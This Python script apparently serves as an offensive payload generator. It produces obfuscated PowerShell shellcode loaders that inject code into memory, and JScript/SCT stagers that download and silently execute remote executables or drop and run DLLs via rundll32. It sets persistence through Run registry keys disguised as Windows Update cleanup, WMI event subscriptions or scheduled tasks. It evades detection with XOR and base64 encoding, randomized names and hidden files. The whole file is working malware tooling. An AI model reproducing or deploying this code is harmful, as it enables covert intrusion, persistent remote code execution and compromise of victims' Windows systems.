#!/usr/bin/env python

import sys, os, re, base64, zlib, random

NAME_LEN_MIN = 4
NAME_LEN_MAX = 8

def randname(ext = None):

    ret = ''
    chars = range(ord('a'), ord('z')) + range(ord('A'), ord('Z')) + \
            range(ord('a'), ord('z')) + range(ord('0'), ord('9'))

    for i in range(0, random.randrange(NAME_LEN_MIN, NAME_LEN_MAX)):

        ret += chr(random.choice(chars))

    if ext is not None:

        ret += '.' + ext

    return chr(random.randrange(ord('a'), ord('z'))) + ret

class ScriptGen(object):

    ENV_DEBUG = 'DEBUG'

    def __init__(self):

        self.verbose = os.getenv(self.ENV_DEBUG) is not None

    def log(self, data):

        if self.verbose: 

            sys.stderr.write('########################################################\n\n')
            sys.stderr.write(data + '\n')

class PowerShellStrip(object):

    VAR_SYSTEM = [ '$false', '$true', '$null', '$_'  ]

    def __init__(self):

        self.var_num = 0

    def process_line(self, content, var):

        # search for the variables by pattern
        matches = re.findall('(\$\w+)', content)

        for v in matches:

            if not var.has_key(v):

                if not v.lower() in self.VAR_SYSTEM:

                    var[v] = '$v%d' % self.var_num
                    self.var_num += 1

                else:

                    var[v] = v

        for v in matches:

            content = content.replace(v, var[v])

        return content

    def process_script(self, data):

        var, ret = {}, []

        # read script contents line by line
        for content in data.split('\n'):

            content = content.strip()

            if len(content) > 0:

                ret.append(self.process_line(content, var))

        return ' '.join(ret)

class PowerShell(ScriptGen):

    DEFAULT_PATH = "C:\\Windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe"
    DEFAULT_AUTORUN_NAME = "Windows Update files clenaup"

    # WITHIN Clause
    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa394527(v=vs.85).aspx
    DEFAULT_WMI_INTERVAL = (1 * 60)

    # seconds to wait before firing WMI filter after system startup
    DEFAULT_WMI_UPTIME = (1 * 60)

    # filter and consumer name
    DEFAULT_WMI_FILTER = "Windows SysPref Filter"
    DEFAULT_WMI_CONSUMER = "Windows SysPref Consumer"

    PAYLOAD_NAME = "localconfig.dat"    

    SHELLCODE_NAME = "shellcode.bin"    

    def _escape(self, data):

        d = { '"': '\\"', "'": "\\'", "\0": "\\\0", "\\": "\\\\" }

        return "".join(d.get(c, c) for c in data)

    def _deflate(self, data):
        
        return base64.b64encode(zlib.compress(data)[2 : -4])

    # def end

    def stage_2(self):

        with open(self.SHELLCODE_NAME, 'rb') as fd:

            shellcode = fd.read()

        data = """& {

function Local:get_t 
{
    Param
    (
        [OutputType([Type])]
        
        [Parameter( Position = 0 )]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
        
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain;
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate');
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run);
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false);
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters);
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed');
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters);
    $MethodBuilder.SetImplementationFlags('Runtime, Managed');
    
    Write-Output $TypeBuilder.CreateType();
}

function Local:get_p
{
    Param
    (
        [OutputType([IntPtr])]
    
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
        
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )
    
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object 
                      { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') };

    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods');       
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle');
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]));    
    $ModuleHandle = $GetModuleHandle.Invoke($null, @($Module));
    $tmpPtr = New-Object IntPtr;
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $ModuleHandle);

    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure));
}

$AddrVirtualAlloc = get_p kernel32.dll VirtualAlloc;
$DelegateVirtualAlloc = get_t @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]);
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddrVirtualAlloc, $DelegateVirtualAlloc);

$AddrCreateThread = get_p Kernel32.dll CreateThread;
$DelegateCreateThread = get_t @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]);
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddrCreateThread, $DelegateCreateThread);

$AddrWaitForSingleObject = get_p kernel32.dll WaitForSingleObject;
$DelegateWaitForSingleObject = get_t @([IntPtr], [UInt32]);
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddrWaitForSingleObject, $DelegateWaitForSingleObject);

$Shellcode = [Convert]::FromBase64String('%s'); 

$Data = [Convert]::FromBase64String((Get-Content ([System.Environment]::ExpandEnvironmentVariables("%%TEMP%%")+"\\\\%s")));
if ($Data) 
{    
    $Data = $Shellcode + $Data;
    $Mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $Data.Length, 0x3000, 0x40);
    if ($Mem)
    {
        [System.Runtime.InteropServices.Marshal]::Copy($Data, 0, $Mem, $Data.Length);
        
        $Param = [IntPtr]($Mem.ToInt32() + $Shellcode.Length);
        $Thread = $CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $Mem, $Param, ([UInt32]0), [IntPtr]::Zero);
        if ($Thread)
        {        
            $WaitForSingleObject.Invoke($Thread, ([UInt32]4294967295)); 
        }
    }
}

}
"""
        data = PowerShellStrip().process_script(data) % (base64.b64encode(shellcode), self.PAYLOAD_NAME)
        
        self.log(data + '\n')

        return data

    # def end

    def stage_1(self, data = None):

        data = self._deflate(self.stage_2() if data is None else data)

        compressed = "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('%s')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();" % data

        self.log(compressed + '\n')

        return compressed

    # def end

    def command(self, path = None, data = None):

        path = self.DEFAULT_PATH if path is None else path

        return "%s -W Hidden -C \"%s\"" % \
               (path, self.stage_1() if data is None else data)

    # def end

    def autorun(self, path = None, name = None):

        command = self.command(path = path)
        name = self.DEFAULT_AUTORUN_NAME if name is None else name

        return """Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"%s"="%s"
        """ % (name, self._escape(command))

    # def end

    def wmi_filter(self, command):

        data = """$fn = "%s"; $cn = "%s";
$cmd = $PSHOME + '\\\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "%s"'; 
gwmi __EventFilter -Namespace root\subscription -Filter "Name='$fn'" | Remove-WmiObject
gwmi __FilterToConsumerBinding -Namespace root\subscription -Filter "Filter = ""__EventFilter.Name='$fn'"" " | Remove-WmiObject
gwmi CommandLineEventConsumer -Namespace root\subscription -Filter "Name='$cn'" | Remove-WmiObject
$q = "SELECT * FROM __InstanceModificationEvent WITHIN %d WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= %d";
$fi = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{ Name = $fn; EventNameSpace = "root\cimv2"; QueryLanguage = "WQL"; Query = $q } -ErrorAction Stop;
$ci = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{ Name = $cn; CommandLineTemplate = $cmd };
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{ Filter = $fi; Consumer = $ci };
        """ % (self.DEFAULT_WMI_FILTER, self.DEFAULT_WMI_CONSUMER, command, 
               self.DEFAULT_WMI_INTERVAL, self.DEFAULT_WMI_UPTIME)

        self.log(data)

        return data

    # def end
# class end

class JScript(ScriptGen): 

    # component version
    SCT_VER = "1.00"

    # for DLL inject payload
    DLL_NAME = "setup.dll"

    # for download and exec payload
    EXE_NAME = "setup.exe"

    # entry point for rundll32
    DLL_ENTRY = "EntryPoint"    

    # use base64 encoded powershell command
    PS_ENCODE = False

    # use task scheduler or explorer autorun
    USE_SCHTASKS = False

    def _strip(self, data):

        ret = ''

        for line in data.split('\n'):

            line = line.strip()

            if len(line) > 0: 

                ret += line + ' '

        return ret

    def stage_1_dll_inject(self, payload):

        with open(payload, 'rb') as fd:

            payload = fd.read()                

        val_name = randname()
        ps_command = "iex($([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer).%s))))" % val_name
        ps_options = "-C"

        ps = PowerShell()

        ps.PAYLOAD_NAME = randname('dat')
        ps.PAYLOAD_NAME = randname('dat')

        self.DLL_NAME = randname('dll')   

        if self.PS_ENCODE:

            self.log(ps_command + '\n')

            ps_command = base64.b64encode(ps_command.encode("UTF-16")[2:])
            ps_options = "-EncodedCommand"

        self.log(ps_command + '\n')

        command = """x1.Run("schtasks /Create /F /SC ONLOGON /TN " + a + " /TR \\"cmd.exe /C start /B " + cc + "\\"", 0, true);""" \
                  if self.USE_SCHTASKS else \
                  """x1.RegWrite("HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\" + a, cc, "REG_SZ");"""

        data = """var c = "%s"; var p = "%s";

var x0 = new ActiveXObject("Scripting.FileSystemObject");
var x1 = new ActiveXObject("WScript.Shell");

var t = x1.ExpandEnvironmentStrings("%%TEMP%%");
var w = x1.ExpandEnvironmentStrings("%%windir%%");

var l = t + "\\\\%s"; var ps = 1; var pp = ""; var cc = "";
var p0 = w + "\\\\syswow64\\\\windowspowershell\\\\v1.0";
var p1 = w + "\\\\system32\\\\windowspowershell\\\\v1.0";

if (x0.FolderExists(p0)) 
{ 
    pp = p0; 
} 
else if (x0.FolderExists(p1)) 
{ 
    pp = p1; 
}
else 
{ 
    var x = new ActiveXObject("MSXml2.DOMDocument");
    var e = x.createElement("root"); e.dataType = "bin.base64"; e.text = p;
    var o = t + "\\\\%s"; 

    if (x0.FileExists(o)) 
    { 
        x0.DeleteFile(o); 
    }

    var s = new ActiveXObject("ADODB.Stream");

    s.Type = 1; 
    s.Open(); 
    s.Write(e.nodeTypedValue); 
    s.SaveToFile(o, 2); 
    s.Close(); 

    ps = 0;
    cc = "rundll32 " + o + ",%s"; 

    x1.Run("attrib +H \\"" + o + "\\"", 0, true); 
}

if (ps == 1) 
{ 
    if (x0.FileExists(l)) 
    { 
        x0.DeleteFile(l); 
    }

    var s = new ActiveXObject("ADODB.Stream");

    s.Open(); 
    s.Type = 2; 
    s.WriteText(p); 
    s.Position = 0; 
    s.SaveToFile(l, 2);

    x1.Run("attrib +H \\"" + l + "\\"", 0, true); 
}

var a = "%s"; 
var v0 = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\CIMV2");
var v1 = v0.Get("Win32_Process");        
var v2 = v0.Get("Win32_ProcessStartup").SpawnInstance_();
var v3 = v1.Methods_("Create").inParameters.SpawnInstance_();

v2.ShowWindow = 0; 
v3.Properties_.Item("ProcessStartupInformation").Value = v2;

if (ps == 1) 
{
    cc = pp + "\\\\powershell.exe -W Hidden %s %s";
    x1.RegWrite("HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\" + a, c, "REG_SZ"); 
}

%s

v3.Properties_.Item("CommandLine").Value = cc; 

v0.ExecMethod("Win32_Process", "Create", v3);

        """ % (base64.b64encode(ps.stage_1()), base64.b64encode(payload), 
               ps.PAYLOAD_NAME, self.DLL_NAME, self.DLL_ENTRY, val_name, 
               ps_options, ps_command, command)        

        data = self._strip(data)

        self.log(data + '\n')

        return data

    def stage_1_download_exec(self, url):

        self.EXE_NAME = randname('exe')

        data = """var a1 = "%s"; var a2 = "%s";

var v0 = new ActiveXObject("WScript.Shell")
var v1 = new ActiveXObject("MSXML2.XMLHTTP");
var v2 = v0.ExpandEnvironmentStrings("%%TEMP%%");

v1.Open("GET", a1, false); 
v1.Send();

if (v1.Status == 200) 
{
    var v4 = v2 + "\\\\" + a2;
    var v3 = new ActiveXObject("ADODB.Stream");     
    var v5 = new ActiveXObject("Scripting.FileSystemObject");

    v3.Open(); 
    v3.Type = 1; 
    v3.Write(v1.ResponseBody); 
    v3.Position = 0;
    
    if (v5.FileExists(v4)) 
    { 
        v5.DeleteFile(v4); 
    } 

    v3.SaveToFile(v4, 2); 
    v3.Close();

    v0.Run(v4, 0, true); 
}
        """ % (url, self.EXE_NAME)

        data = self._strip(data)

        return data

    def script(self, data):

        randvar = lambda: chr(random.randrange(ord('a'), ord('z'))) + randname()

        key = random.randrange(0, 0xff)

        data = """
{0} = "%s";
{1} = new ActiveXObject("MSXml2.DOMDocument");
{2} = {1}.createElement("{2}"); {2}.dataType = "bin.base64"; {2}.text = {0};
{3} = {1}.createElement("{3}"); {3}.dataType = "bin.hex"; {3}.nodeTypedValue = {2}.nodeTypedValue;

{4} = {3}.text;
{5} = {4}.length;
{6} = String;
{7} = eval;
{0} = "";

for ({8} = 0; {8} < {5} / 2; {8}++) 
{{
    {9} = parseInt({4}.substr({8} * 2, 2), 16);
    {10} = {9} ^ %d;
    {11} = {6}.fromCharCode({10}); 

    {0} += {11};    
}};

{12} = function() 
{{ 
    this.{13} = function({14}) {{ {7}({14}); }};
}};

{15} = new {12};
{15}.{13}({0});

        """ % (base64.b64encode(''.join(map(lambda c: chr(ord(c) ^ key), data))), key)        

        data = data.format(randvar(), randvar(), randvar(), randvar(), 
                           randvar(), randvar(), randvar(), randvar(), 
                           randvar(), randvar(), randvar(), randvar(), 
                           randvar(), randvar(), randvar(), randvar())

        data = self._strip(data)

        return data

    def sct(self, data):

        data = """<?xml version='1.0'?>
<package>
<component id='{0}'>
<registration
  description='{1}'
  progid='{2}'
  version='{3}'
  remotable='True'>
</registration>
<script language='JScript'>
<![CDATA[

{4}

]]>
</script>
</component>
</package>
        """.format(randname(), randname(), randname(), self.SCT_VER, data)

        return data

def main():

    if len(sys.argv) < 3:

        print("USAGE: payload_encoder.py <mode> <payload>")
        return -1

    mode = sys.argv[1]
    payload = sys.argv[2]    

    js, ps = JScript(), PowerShell()

    if mode == 'dll_inject':

        data = js.stage_1_dll_inject(payload)

    elif mode == 'dll_inject_script':

        data = js.script(js.stage_1_dll_inject(payload))

    elif mode == 'dll_inject_sct':

        data = js.sct(js.script(js.stage_1_dll_inject(payload)))

    elif mode == 'download_exec':

        data = js.stage_1_download_exec(payload)

    elif mode == 'download_exec_script':

        data = js.script(js.stage_1_download_exec(payload))

    elif mode == 'download_exec_sct':

        data = js.sct(js.script(js.stage_1_download_exec(payload)))

    else:

        print("ERROR: Bad mode specified")
        return -1

    print(data)

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#


